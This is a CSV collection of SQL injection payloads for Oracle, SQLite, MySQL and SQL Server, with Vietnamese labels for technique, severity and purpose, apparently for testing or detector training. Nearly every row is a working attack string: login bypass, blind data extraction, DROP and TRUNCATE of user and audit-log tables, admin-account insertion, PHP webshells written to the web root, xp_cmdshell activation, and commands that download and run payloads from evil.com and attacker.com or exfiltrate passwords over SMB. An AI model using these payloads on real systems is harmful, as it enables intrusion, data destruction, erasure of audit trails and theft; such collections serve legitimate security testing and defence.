payload,type,technique,dbms,severity,purpose,description,source
"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0 --",Blind,Time-based,Oracle,Cao,Truy cập trái phép,Gây trì hoãn 5 giây để xác định lỗ hổng,Pentestmonkey Oracle Injection Cheat Sheet
"' AND CASE WHEN (USER='SYSTEM') THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END=0 --",Blind,Time-based,Oracle,Cao,Truy cập trái phép,Xác định người dùng hiện tại là SYSTEM bằng kỹ thuật time-based,PortSwigger Web Security Academy
' OR 1=1 --,In-band,UNION-based,SQLite,Trung bình,Truy cập trái phép,Bypass đăng nhập bằng cách luôn tạo điều kiện TRUE,OWASP SQL Injection Prevention Cheat Sheet
"' UNION SELECT 1,2,3 --",In-band,UNION-based,SQLite,Trung bình,Truy cập trái phép,Xác định số cột trong bảng hiện tại,PortSwigger Web Security Academy
"' UNION SELECT name, sql, NULL FROM sqlite_master --",In-band,UNION-based,SQLite,Cao,Truy cập trái phép,Lấy tên và cấu trúc của các bảng trong SQLite,OWASP Testing Guide v4
' AND 1=CAST((SELECT sqlite_version()) AS INTEGER) --,In-band,Error-based,SQLite,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị phiên bản SQLite,HackTricks SQL Injection Guide
' AND 1=RANDOMBLOB(1000000000) --,In-band,Error-based,SQLite,Cao,Truy cập trái phép,Gây lỗi do yêu cầu quá nhiều bộ nhớ,Pentestmonkey SQLite Injection Cheat Sheet
' AND (SELECT COUNT(*) FROM sqlite_master)>0 --,Blind,Boolean-based,SQLite,Cao,Truy cập trái phép,Xác định số lượng bảng trong cơ sở dữ liệu,PortSwigger Web Security Academy
"' AND SUBSTR((SELECT sqlite_version()),1,1)='3' --",Blind,Boolean-based,SQLite,Cao,Truy cập trái phép,Xác định chữ số đầu tiên của phiên bản SQLite,HackTricks SQL Injection Guide
"' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) --",Blind,Time-based,SQLite,Cao,Truy cập trái phép,Gây trì hoãn bằng cách thực hiện tác vụ nặng,HackTricks SQL Injection Guide
"' AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 1 END) --",Blind,Time-based,SQLite,Cao,Truy cập trái phép,Gây trì hoãn có điều kiện để xác nhận lỗ hổng,PortSwigger Web Security Academy
'; DROP DATABASE test; -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa toàn bộ cơ sở dữ liệu test,OWASP SQL Injection Testing Guide
'; DROP TABLE IF EXISTS admin; -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa bảng admin nếu tồn tại,HackTricks SQL Injection Guide
'; DROP DATABASE test; -- ,In-band,UNION-based,SQL Server,Cao,Xóa dữ liệu,Xóa toàn bộ cơ sở dữ liệu test,Pentestmonkey SQL Server Injection Cheat Sheet
'; IF EXISTS(SELECT * FROM sysobjects WHERE name='admin') DROP TABLE admin; -- ,In-band,UNION-based,SQL Server,Cao,Xóa dữ liệu,Xóa bảng admin nếu tồn tại,HackTricks SQL Injection Guide
"'; SELECT BIN_TO_UUID(UNHEX(SHA2('pwd',512))) INTO OUTFILE '/var/www/html/backdoor.php' -- -",In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo file PHP có thể được sử dụng cho backdoor,OWASP SQL Injection Testing Guide
'; SELECT '<?php echo(`cat /etc/passwd`);?>' INTO OUTFILE '/var/www/html/read_passwd.php' -- -,In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo script PHP để đọc file /etc/passwd trên máy chủ,HackTricks SQL Injection Guide
'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /ADD && net localgroup Administrators hacker /ADD' -- ,In-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Thêm người dùng mới vào nhóm Administrators,Pentestmonkey SQL Server Injection Cheat Sheet
'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://evil.com/backdoor.exe C:\backdoor.exe && C:\backdoor.exe' -- ,In-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Tải và thực thi file thực thi độc hại,HackTricks SQL Injection Guide
'; UPDATE users SET email='attacker@evil.com' WHERE privilege='admin' -- -,In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Thay đổi email của tất cả tài khoản admin,OWASP SQL Injection Testing Guide
"'; UPDATE users SET email=CONCAT(username,'@evil.com') -- -",In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Sửa đổi email của tất cả người dùng thành dạng username@evil.com,HackTricks SQL Injection Guide
'; UPDATE users SET email='attacker@evil.com' WHERE privilege='admin' -- ,In-band,UNION-based,SQL Server,Cao,Sửa đổi dữ liệu,Thay đổi email của tất cả tài khoản admin,Pentestmonkey SQL Server Injection Cheat Sheet
'; UPDATE users SET email=username+'@evil.com' -- ,In-band,UNION-based,SQL Server,Cao,Sửa đổi dữ liệu,Sửa đổi email của tất cả người dùng thành dạng username@evil.com,HackTricks SQL Injection Guide
'; UPDATE users SET password='hacked' WHERE username='admin' AND 1=1; -- -,Blind,Boolean-based,MySQL,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin với điều kiện boolean,OWASP SQL Injection Testing Guide
'; UPDATE users SET is_admin=1 WHERE username='attacker' AND (SELECT 1 FROM dual WHERE 1=1); -- -,Blind,Boolean-based,MySQL,Cao,Sửa đổi dữ liệu,Nâng quyền người dùng 'attacker' thành admin với điều kiện boolean,HackTricks SQL Injection Guide
'; UPDATE users SET password='hacked' WHERE username='admin' AND 1=1; -- ,Blind,Boolean-based,SQL Server,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin với điều kiện boolean,Pentestmonkey SQL Server Injection Cheat Sheet
'; UPDATE users SET is_admin=1 WHERE username='attacker' AND (SELECT 1 WHERE 1=1); -- ,Blind,Boolean-based,SQL Server,Cao,Sửa đổi dữ liệu,Nâng quyền người dùng 'attacker' thành admin với điều kiện boolean,HackTricks SQL Injection Guide
"'; UPDATE users SET password='hacked' WHERE username='admin' AND IF(1=1, SLEEP(5), 0); -- -",Blind,Time-based,MySQL,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin với điều kiện time-based,OWASP SQL Injection Testing Guide
'; UPDATE users SET is_admin=1 WHERE username='attacker' AND (SELECT SLEEP(5)); -- -,Blind,Time-based,MySQL,Cao,Sửa đổi dữ liệu,Nâng quyền người dùng 'attacker' thành admin với điều kiện time-based,HackTricks SQL Injection Guide
'; UPDATE users SET password='hacked' WHERE username='admin'; WAITFOR DELAY '0:0:5'; -- ,Blind,Time-based,SQL Server,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin với điều kiện time-based,Pentestmonkey SQL Server Injection Cheat Sheet
'; UPDATE users SET is_admin=1 WHERE username='attacker'; WAITFOR DELAY '0:0:5'; -- ,Blind,Time-based,SQL Server,Cao,Sửa đổi dữ liệu,Nâng quyền người dùng 'attacker' thành admin với điều kiện time-based,HackTricks SQL Injection Guide
'; DELETE FROM users WHERE username!='admin' AND 1=1; -- -,Blind,Boolean-based,MySQL,Cao,Xóa dữ liệu,Xóa tất cả người dùng trừ admin với điều kiện boolean,OWASP SQL Injection Testing Guide
' AND (SELECT TOP 1 name FROM sysobjects WHERE id=1)>'a' -- ,Blind,Boolean-based,SQL Server,Cao,Truy cập trái phép,Xác định chữ cái đầu tiên của tên đối tượng đầu tiên,Pentestmonkey SQL Server Injection Cheat Sheet
"' UNION SELECT 1,2,LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE id=1),'.attackerdomain.com\\share\\')) -- -",Out-of-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Trích xuất mật khẩu và gửi dữ liệu đến máy chủ của kẻ tấn công,OWASP SQL Injection Testing Guide
'; SELECT ... INTO OUTFILE '\\\\attackerip\\share\\output.txt' -- -,Out-of-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Xuất dữ liệu truy vấn đến chia sẻ SMB từ xa,HackTricks SQL Injection Guide
'; EXEC master..xp_dirtree '\\attackerserver\share' -- ,Out-of-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Tạo kết nối SMB đến máy chủ của kẻ tấn công,Pentestmonkey SQL Server Injection Cheat Sheet
'; DECLARE @q VARCHAR(8000);SET @q=CAST(0x4445434C415245204054207661726368617228363535333529204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C40432057484944 AS VARCHAR(8000));EXEC(@q); -- ,Out-of-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Thực thi mã T-SQL được mã hóa HEX để che giấu hành động,HackTricks SQL Injection Guide
"' UNION SELECT 1,2,'<?php system($_GET[""cmd""]);?>' INTO OUTFILE '/var/www/html/cmd.php' -- -",In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo webshell PHP đơn giản,Pentestmonkey MySQL Injection Cheat Sheet
"' UNION SELECT 1,2,'<?php echo ""<pre>""; system($_REQUEST[""cmd""]); echo ""</pre>""; ?>' INTO OUTFILE '/var/www/html/shell.php' -- -",In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo webshell PHP với định dạng đầu ra,OWASP SQL Injection Testing Guide
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -,Blind,Time-based,MySQL,Cao,Truy cập trái phép,Gây trì hoãn 5 giây sử dụng subquery,Pentestmonkey MySQL Injection Cheat Sheet
"' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5,SLEEP(5),0) -- -",Blind,Time-based,MySQL,Cao,Truy cập trái phép,Kiểm tra số lượng bảng trong database hiện tại,PortSwigger Web Security Academy
"' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='a' -- -",Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Kiểm tra ký tự đầu tiên của bảng đầu tiên,HackTricks SQL Injection Guide
' AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%') -- -,Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Kiểm tra mật khẩu của admin bắt đầu bằng 'a',OWASP SQL Injection Testing Guide
' AND 1=(SELECT 1/0 FROM sysobjects WHERE name='users') -- ,In-band,Error-based,SQL Server,Cao,Truy cập trái phép,Gây lỗi chia cho 0 nếu bảng users tồn tại,Pentestmonkey SQL Server Injection Cheat Sheet
' AND 1=(SELECT CAST(db_name() AS int)) -- ,In-band,Error-based,SQL Server,Cao,Truy cập trái phép,Gây lỗi chuyển đổi kiểu để hiển thị tên database hiện tại,HackTricks SQL Injection Guide
"' AND (SELECT 2*(IF((SELECT * FROM users LIMIT 1)='',1,0))*'') -- -",In-band,Error-based,MySQL,Cao,Truy cập trái phép,Sử dụng lỗi toán học để kiểm tra bảng users có dữ liệu,Pentestmonkey MySQL Injection Cheat Sheet
"' AND (SELECT 2*(IF((SELECT * FROM information_schema.tables WHERE table_schema=database() AND table_name='users' LIMIT 1)='',1,0))*'') -- -",In-band,Error-based,MySQL,Cao,Truy cập trái phép,Sử dụng lỗi toán học để kiểm tra bảng users tồn tại,OWASP SQL Injection Testing Guide
"'; INSERT INTO users (username, password, email, is_admin) VALUES ('hacker', 'p455w0rd', 'hacker@evil.com', 1) -- -",In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Thêm tài khoản admin mới vào hệ thống,OWASP SQL Injection Testing Guide
'; UPDATE users SET email='hacked@evil.com' -- -,In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Thay đổi email của tất cả người dùng,HackTricks SQL Injection Guide
"'; INSERT INTO users (username, password, email, admin_level) VALUES ('backdoor', 'h4ck3d', 'evil@hacker.com', 99) -- ",In-band,UNION-based,SQL Server,Cao,Sửa đổi dữ liệu,Thêm tài khoản người dùng với quyền cao nhất,Pentestmonkey SQL Server Injection Cheat Sheet
'; UPDATE users SET admin_level=99 WHERE username='victim' -- ,In-band,UNION-based,SQL Server,Cao,Sửa đổi dữ liệu,Nâng cấp quyền của một người dùng cụ thể,HackTricks SQL Injection Guide
'; DROP TABLE users -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa hoàn toàn bảng users,OWASP SQL Injection Testing Guide
'; DELETE FROM audit_log -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa tất cả các bản ghi nhật ký kiểm toán,HackTricks SQL Injection Guide
'; DROP TABLE audit_logs -- ,In-band,UNION-based,SQL Server,Cao,Xóa dữ liệu,Xóa hoàn toàn bảng audit_logs,Pentestmonkey SQL Server Injection Cheat Sheet
'; TRUNCATE TABLE access_logs -- ,In-band,UNION-based,SQL Server,Cao,Xóa dữ liệu,Xóa toàn bộ nhật ký truy cập,HackTricks SQL Injection Guide
"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a); UPDATE users SET password='hacked' WHERE id=1; -- -",Blind,Boolean-based,MySQL,Cao,Sửa đổi dữ liệu,Sử dụng lỗi GROUP BY để thực hiện cập nhật mật khẩu,OWASP SQL Injection Testing Guide
' AND 1=1; UPDATE users SET password='pwned' WHERE username='admin' -- ,Blind,Boolean-based,SQL Server,Cao,Sửa đổi dữ liệu,Cập nhật mật khẩu của admin,Pentestmonkey SQL Server Injection Cheat Sheet
"' UNION SELECT 1,2,'<?php include($_GET[""shell""]);?>' INTO OUTFILE '/var/www/html/backdoor.php' -- -",In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo backdoor PHP để thực thi lệnh từ xa,Pentestmonkey MySQL Injection Cheat Sheet
'; DROP DATABASE production; -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa toàn bộ cơ sở dữ liệu production,OWASP SQL Injection Testing Guide
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- ",In-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Kích hoạt xp_cmdshell để thực thi lệnh hệ thống,Pentestmonkey SQL Server Injection Cheat Sheet
'; UPDATE users SET password='hacked' WHERE id=1; SELECT SLEEP(5); -- -,Blind,Time-based,MySQL,Cao,Sửa đổi dữ liệu,Cập nhật mật khẩu và gây trì hoãn để xác nhận thành công,OWASP SQL Injection Testing Guide
'; DROP TABLE access_logs; WAITFOR DELAY '0:0:5'; -- ,Blind,Time-based,SQL Server,Cao,Xóa dữ liệu,Xóa bảng nhật ký truy cập và gây trì hoãn,Pentestmonkey SQL Server Injection Cheat Sheet
' AND 1=1; DELETE FROM users WHERE id!=1; -- -,Blind,Boolean-based,MySQL,Cao,Xóa dữ liệu,Xóa tất cả người dùng trừ người dùng id=1,OWASP SQL Injection Testing Guide
' AND 1=1 -- ,Blind,Boolean-based,SQL Server,Trung bình,Truy cập trái phép,Kiểm tra điều kiện boolean trả về TRUE,PortSwigger Web Security Academy
' AND 1=2 -- ,Blind,Boolean-based,SQL Server,Trung bình,Truy cập trái phép,Kiểm tra điều kiện boolean trả về FALSE,PortSwigger Web Security Academy
"' AND (SELECT SUBSTRING(name,1,1) FROM sysobjects WHERE id=1)='a' -- ",Blind,Boolean-based,SQL Server,Cao,Truy cập trái phép,Trích xuất ký tự đầu tiên của tên đối tượng,OWASP Testing Guide v4
' WAITFOR DELAY '0:0:5' -- ,Blind,Time-based,SQL Server,Cao,Truy cập trái phép,Gây trì hoãn 5 giây để xác định lỗ hổng,Pentestmonkey SQL Server Injection Cheat Sheet
' IF 1=1 WAITFOR DELAY '0:0:5' -- ,Blind,Time-based,SQL Server,Cao,Truy cập trái phép,Trì hoãn có điều kiện để xác nhận lỗ hổng,PortSwigger Web Security Academy
"' IF (SELECT ASCII(SUBSTRING(@@version,1,1)))=53 WAITFOR DELAY '0:0:5' -- ",Blind,Time-based,SQL Server,Cao,Truy cập trái phép,Xác định phiên bản SQL Server bằng kỹ thuật time-based,HackTricks SQL Injection Guide
'; UPDATE users SET password='hacked' WHERE username='admin' -- -,In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin,OWASP SQL Injection Testing Guide
'; UPDATE users SET is_admin=1 WHERE username='hacker' -- -,In-band,UNION-based,MySQL,Cao,Sửa đổi dữ liệu,Nâng cấp quyền của người dùng thành admin,HackTricks SQL Injection Guide
'; UPDATE users SET password='hacked' WHERE username='admin' -- ,In-band,UNION-based,SQL Server,Cao,Sửa đổi dữ liệu,Thay đổi mật khẩu của admin trong SQL Server,Pentestmonkey SQL Server Injection Cheat Sheet
'; DELETE FROM users WHERE username!='admin' -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa tất cả người dùng trừ admin,OWASP SQL Injection Testing Guide
'; TRUNCATE TABLE logs -- -,In-band,UNION-based,MySQL,Cao,Xóa dữ liệu,Xóa toàn bộ bảng logs,HackTricks SQL Injection Guide
'; DELETE FROM users -- ,In-band,UNION-based,SQL Server,Cao,Xóa dữ liệu,Xóa toàn bộ bảng users,Pentestmonkey SQL Server Injection Cheat Sheet
'; SELECT LOAD_FILE('/etc/passwd') -- -,In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Đọc file /etc/passwd trên hệ thống,Pentestmonkey MySQL Injection Cheat Sheet
"'; SELECT '<?php system($_GET[""cmd""]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -",In-band,UNION-based,MySQL,Cao,Thực thi lệnh hệ thống,Tạo webshell PHP để thực thi lệnh hệ thống,HackTricks SQL Injection Guide
'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add' -- ,In-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Thêm người dùng hacker vào hệ thống,Pentestmonkey SQL Server Injection Cheat Sheet
"'; EXEC master..xp_cmdshell 'powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')""' -- ",In-band,UNION-based,SQL Server,Cao,Thực thi lệnh hệ thống,Tải và thực thi script PowerShell từ xa,HackTricks SQL Injection Guide
' -- -,In-band,UNION-based,MySQL,Thấp,Truy cập trái phép,Comment phần còn lại của truy vấn để xác định lỗ hổng,OWASP SQL Injection Testing Guide
admin' -- -,In-band,UNION-based,MySQL,Thấp,Truy cập trái phép,Đăng nhập với tên 'admin' mà không cần mật khẩu,PortSwigger Web Security Academy
' -- ,In-band,UNION-based,SQL Server,Thấp,Truy cập trái phép,Comment phần còn lại của truy vấn để xác định lỗ hổng,OWASP SQL Injection Testing Guide
